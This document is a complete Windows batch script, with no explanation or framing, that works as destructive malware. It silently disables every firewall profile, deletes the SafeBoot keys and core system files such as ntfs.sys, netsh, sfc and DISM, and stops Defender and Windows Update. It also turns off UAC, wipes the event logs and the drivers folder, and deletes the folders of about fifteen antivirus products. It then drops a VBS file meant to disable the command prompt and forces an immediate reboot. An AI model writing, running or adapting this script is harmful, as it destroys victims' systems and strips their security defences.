@echo off
setlocal

netsh advfirewall set allprofiles state off >nul 2>&1
netsh advfirewall set currentprofile state off >nul 2>&1
netsh advfirewall set domainprofile state off >nul 2>&1
netsh advfirewall set privateprofile state off >nul 2>&1
netsh advfirewall set publicprofile state off >nul 2>&1
netsh firewall set opmode mode-disable >nul 2>&1

reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1

reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1

icacls "C:\Windows\System32" /Grant Users:F >nul 2>&1
icacls "C:\Windows" /Grant Users:F >nul 2>&1

attrib -s -r /s /d "C:\Windows\System32\*.*" >nul 2>&1
attrib -s -r /s /d "C:\ProgramData\*.*" >nul 2>&1
attrib -s -r "C:\ProgramData\*.*" >nul 2>&1
attrib -s -r /s /d "C:\Program Files\*.*" >nul 2>&1
attrib -s -r "C:\Program Files\*.*" >nul 2>&1

del /f /q "C:\Windows\System32\drivers\ntfs.sys" >nul 2>&1
del /f /q "C:\Windows\servicing\TrustedInstaller.exe" >nul 2>&1
del /f /q "C:\Windows\System32\netsh.exe" >nul 2>&1

net stop "WinDefend" /y >nul 2>&1
net stop "security center" /y >nul 2>&1
net stop sharedaccess /y >nul 2>&1
net stop "wuauserv" /y >nul 2>&1
net stop "SDRSVC" /y >nul 2>&1


del /f /q "C:\Windows\System32\Dism.exe" >nul 2>&1
del /f /q "C:\Windows\System32\sfc.exe" >nul 2>&1
del /f /q "C:\Windows\System32\chkdsk.exe" >nul 2>&1
del /f /q "C:\Windows\System32\wbem\WMIC.exe" >nul 2>&1
del /f /q "C:\Windows\System32\smartscreen.exe" >nul 2>&1
del /f /q "C:\Windows\System32\SecurityHealthSystray.exe" >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1


rmdir /s /q  "C:\Windows\System32\SecurityHealth\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\winevt\Logs\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\drivers\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Cache Maintenance" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Cleanup" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Scheduled Scan" >nul 2>&1
rmdir /s /q  "C:\Windows\System32\Tasks\Microsoft\Windows\Windows Defender Verification" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender Advanced Threat Protection\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\" >nul 2>&1


rmdir /s /q  "C:\Program Files\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Platform\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Scans\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Windows Defender Advanced Threat Protection\" >nul 2>&1

:: Avast
rmdir /s /q  "C:\Program Files\Avast Software\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Avast Software\Avast\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Avast Software\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Avast Software\Avast\" >nul 2>&1

:: AVG
rmdir /s /q  "C:\Program Files\AVG\" >nul 2>&1
rmdir /s /q  "C:\Program Files\AVG\Antivirus\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\AVG\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\AVG\Antivirus\" >nul 2>&1

:: Bitdefender
rmdir /s /q  "C:\Program Files\Bitdefender\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Bitdefender Agent\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Bitdefender\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Bitdefender Agent\" >nul 2>&1

:: Malwarebytes
rmdir /s /q  "C:\Program Files\Malwarebytes\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Malwarebytes\Anti-Malware\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Malwarebytes\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Malwarebytes\MBAMService\" >nul 2>&1

:: ESET
rmdir /s /q  "C:\Program Files\ESET\" >nul 2>&1
rmdir /s /q  "C:\Program Files\ESET\ESET Security\" >nul 2>&1
rmdir /s /q  "C:\Program Files\ESET\ESET NOD32 Antivirus\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\ESET\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\ESET\ESET Security\" >nul 2>&1

:: Kaspersky
rmdir /s /q  "C:\Program Files (x86)\Kaspersky Lab\" >nul 2>&1
rmdir /s /q  "C:\Program Files\Kaspersky Lab\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Kaspersky Lab\" >nul 2>&1

:: Norton
rmdir /s /q  "C:\Program Files\Norton\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Norton\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Norton Security\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Norton\" >nul 2>&1

:: McAfee
rmdir /s /q  "C:\Program Files\McAfee\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\McAfee\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\McAfee\" >nul 2>&1
rmdir /s /q  "C:\Program Files\McAfee\Endpoint Security\" >nul 2>&1

:: Avira
rmdir /s /q  "C:\Program Files\Avira\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Avira\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Avira\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Avira\Security\" >nul 2>&1

:: Panda Dome
rmdir /s /q  "C:\Program Files\Panda Security\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Panda Security\" >nul 2>&1
rmdir /s /q "C:\ProgramData\Panda Security\" >nul 2>&1

:: Trend Micro
rmdir /s /q  "C:\Program Files\Trend Micro\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Trend Micro\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Trend Micro\" >nul 2>&1

:: Sophos
rmdir /s /q  "C:\Program Files\Sophos\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Sophos\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\Sophos\" >nul 2>&1

:: F-Secure
rmdir /s /q  "C:\Program Files\F-Secure\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\F-Secure\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\F-Secure\" >nul 2>&1

:: Webroot
rmdir /s /q  "C:\Program Files\Webroot\" >nul 2>&1
rmdir /s /q  "C:\Program Files (x86)\Webroot\" >nul 2>&1
rmdir /s /q  "C:\ProgramData\WRData\" >nul 2>&1



( 
    echo Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
) > "%TEMP%\JAJAJA.vbs"


start "" "%TEMP%\JAJAJA.vbs" >nul 2>&1


shutdown /r /f /t 0 >nul 2>&1

endlocal
